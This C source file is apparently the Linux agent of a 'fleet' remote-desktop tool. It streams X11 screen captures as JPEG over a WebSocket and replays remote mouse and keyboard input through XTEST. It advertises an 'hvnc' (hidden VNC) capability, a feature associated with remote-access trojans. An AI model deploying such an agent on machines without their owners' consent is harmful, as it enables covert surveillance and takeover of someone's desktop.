/* fleet rd-linux: X11 XGetImage capture + XTEST input -> WebSocket JPEG stream.
 * If DISPLAY is unset it connects in view-only (no frames). */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <jpeglib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/extensions/XTest.h>

#include "../ws.h"

/* key is the quoted field name e.g. "\"t\"" */
static int json_str_is(const char *s, const char *key, const char *value) {
    const char *p = strstr(s, key);
    if (!p) return 0;
    p += strlen(key);
    while (*p == ' ' || *p == ':' || *p == '\t') p++;
    if (*p != '"') return 0;
    p++;
    size_t n = strlen(value);
    return strncmp(p, value, n) == 0 && p[n] == '"';
}

static int json_num(const char *s, const char *key, double *out) {
    const char *p = strstr(s, key);
    if (!p) return 0;
    p += strlen(key);
    while (*p == ' ' || *p == ':' || *p == '"') p++;
    *out = strtod(p, NULL);
    return 1;
}

static int shift_of(unsigned long mask) {
    int shift = 0;
    if (!mask) return 8;
    while (!(mask & 1)) {
        mask >>= 1;
        shift++;
    }
    return shift;
}

static int component(unsigned long pixel, unsigned long mask, int shift) {
    if (!mask) return 128;
    unsigned long value = (pixel & mask) >> shift;
    unsigned long max = mask >> shift;
    return (int)((value * 255) / (max ? max : 1));
}

static unsigned char *capture_rgb(Display *dpy, int *out_w, int *out_h) {
    int scr = DefaultScreen(dpy);
    Window root = RootWindow(dpy, scr);
    int w = DisplayWidth(dpy, scr);
    int h = DisplayHeight(dpy, scr);
    XImage *img = XGetImage(dpy, root, 0, 0, (unsigned)w, (unsigned)h, AllPlanes, ZPixmap);
    if (!img) return NULL;
    /* downscale wide multi-monitor desktops for realtime bandwidth */
    int sw = w, sh = h, maxw = 1600;
    if (w > maxw) {
        sw = maxw;
        sh = (int)((long long)h * maxw / w);
        if (sh <= 0) sh = 1;
    }
    unsigned char *rgb = (unsigned char *)malloc((size_t)sw * sh * 3);
    if (!rgb) {
        XDestroyImage(img);
        return NULL;
    }
    int rs = shift_of(img->red_mask), gs = shift_of(img->green_mask),
        bs = shift_of(img->blue_mask);
    for (int y = 0; y < sh; y++) {
        int sy = (int)((long long)y * h / sh);
        for (int x = 0; x < sw; x++) {
            int sx = (int)((long long)x * w / sw);
            unsigned long px = XGetPixel(img, sx, sy);
            unsigned char *o = rgb + ((size_t)y * sw + x) * 3;
            o[0] = (unsigned char)component(px, img->red_mask, rs);
            o[1] = (unsigned char)component(px, img->green_mask, gs);
            o[2] = (unsigned char)component(px, img->blue_mask, bs);
        }
    }
    XDestroyImage(img);
    *out_w = sw;
    *out_h = sh;
    return rgb;
}

static unsigned char *jpeg_encode(const unsigned char *rgb, int w, int h, unsigned long *out_len) {
    struct jpeg_compress_struct cinfo;
    struct jpeg_error_mgr jerr;
    cinfo.err = jpeg_std_error(&jerr);
    jpeg_create_compress(&cinfo);
    unsigned char *out = NULL;
    jpeg_mem_dest(&cinfo, &out, out_len);
    cinfo.image_width = (JDIMENSION)w;
    cinfo.image_height = (JDIMENSION)h;
    cinfo.input_components = 3;
    cinfo.in_color_space = JCS_RGB;
    jpeg_set_defaults(&cinfo);
    jpeg_set_quality(&cinfo, 60, TRUE);
    jpeg_start_compress(&cinfo, TRUE);
    while (cinfo.next_scanline < cinfo.image_height) {
        JSAMPROW row = (JSAMPROW)(rgb + (size_t)cinfo.next_scanline * (size_t)w * 3);
        jpeg_write_scanlines(&cinfo, &row, 1);
    }
    jpeg_finish_compress(&cinfo);
    jpeg_destroy_compress(&cinfo);
    return out;
}

static void apply_input(Display *dpy, const char *msg, int w, int h) {
    double x, y, btn, code, down;
    if (json_str_is(msg, "\"t\"", "m") && json_num(msg, "\"x\"", &x) && json_num(msg, "\"y\"", &y)) {
        XTestFakeMotionEvent(dpy, -1, (int)(x * w), (int)(y * h), 0);
    } else if (json_str_is(msg, "\"t\"", "b") && json_num(msg, "\"btn\"", &btn)) {
        json_num(msg, "\"down\"", &down);
        XTestFakeButtonEvent(dpy, (unsigned)btn, down != 0, 0);
    } else if (json_str_is(msg, "\"t\"", "k") && json_num(msg, "\"code\"", &code)) {
        json_num(msg, "\"down\"", &down);
        XTestFakeKeyEvent(dpy, (unsigned)code, down != 0, 0);
    }
    XFlush(dpy);
}

int main(int argc, char **argv) {
    const char *host = "127.0.0.1";
    const char *session = "session";
    const char *token = "";
    int port = 8443;
    const char *mode = "desktop";
    for (int i = 1; i < argc - 1; i++) {
        if (strcmp(argv[i], "--host") == 0) host = argv[++i];
        else if (strcmp(argv[i], "--port") == 0) port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--session") == 0) session = argv[++i];
        else if (strcmp(argv[i], "--token") == 0) token = argv[++i];
        else if (strcmp(argv[i], "--mode") == 0) mode = argv[++i];
    }
    int hvnc = (strcmp(mode, "hvnc") == 0);
    srand((unsigned)getpid());

    char path[512];
    snprintf(path, sizeof(path), "/rd/%s?token=%s", session, token);

    ws_t ws;
    ws.fd = WS_INVALID;
    if (ws_connect(&ws, host, port, path) != 0) {
        fprintf(stderr, "rd-linux: cannot connect ws://%s:%d%s\n", host, port, path);
        return 1;
    }

    Display *dpy = XOpenDisplay(NULL);
    int view_only = (dpy == NULL);
    int full_w = 0, full_h = 0;      /* native X screen (input space) */
    int w = 0, h = 0;                /* streamed frame size (scaled) */
    if (!view_only) {
        full_w = DisplayWidth(dpy, DefaultScreen(dpy));
        full_h = DisplayHeight(dpy, DefaultScreen(dpy));
        w = full_w;
        h = full_h;
        if (w > 1600) {
            w = 1600;
            h = (int)((long long)full_h * 1600 / full_w);
            if (h <= 0) h = 1;
        }
        XTestQueryExtension(dpy, &(int){0}, &(int){0}, &(int){0}, &(int){0});
    }

    char hello[320];
    snprintf(hello, sizeof(hello),
             "{\"t\":\"hello\",\"os\":\"linux\",\"w\":%d,\"h\":%d,\"view_only\":%s,"
             "\"mode\":\"%s\",\"caps\":[\"desktop\",\"input\",\"hvnc\"],\"hvnc\":%s}",
             w, h, view_only ? "true" : "false", mode, (hvnc && !view_only) ? "true" : "false");
    ws_send(&ws, hello, strlen(hello), 1);

    if (view_only) {
        char buf[1024];
        for (;;) {
            if (ws_wait(&ws, 200000) == 1) {
                if (ws_recv(&ws, buf, sizeof(buf) - 1, NULL) <= 0) break;
            }
        }
        ws_close(&ws);
        return 0;
    }

    char inbuf[4096];
    long delay = 125000; /* 8 fps ceiling */
    for (;;) {
        if (ws_wait(&ws, 0) == 1) {
            int op = 0;
            long n = ws_recv(&ws, inbuf, sizeof(inbuf) - 1, &op);
            if (n <= 0) break;
            inbuf[n] = 0;
            if (op == 1) {
                apply_input(dpy, inbuf, full_w, full_h);
            }
        }

        int fw = 0, fh = 0;
        unsigned char *rgb = capture_rgb(dpy, &fw, &fh);
        if (!rgb) {
            usleep(100000);
            continue;
        }
        unsigned long jlen = 0;
        unsigned char *jpg = jpeg_encode(rgb, fw, fh, &jlen);
        free(rgb);
        if (!jpg) continue;
        long start = (long)(clock() * 1000000 / CLOCKS_PER_SEC);
        int rc = ws_send(&ws, jpg, jlen, 2);
        free(jpg);
        if (rc != 0) break;
        long elapsed = (long)(clock() * 1000000 / CLOCKS_PER_SEC) - start;
        if (elapsed > 125000) {
            delay = 500000; /* degrade to 2 fps on slow links */
        } else if (elapsed < 60000) {
            delay = 125000;
        }
        usleep((useconds_t)delay);
    }

    ws_close(&ws);
    XCloseDisplay(dpy);
    return 0;
}
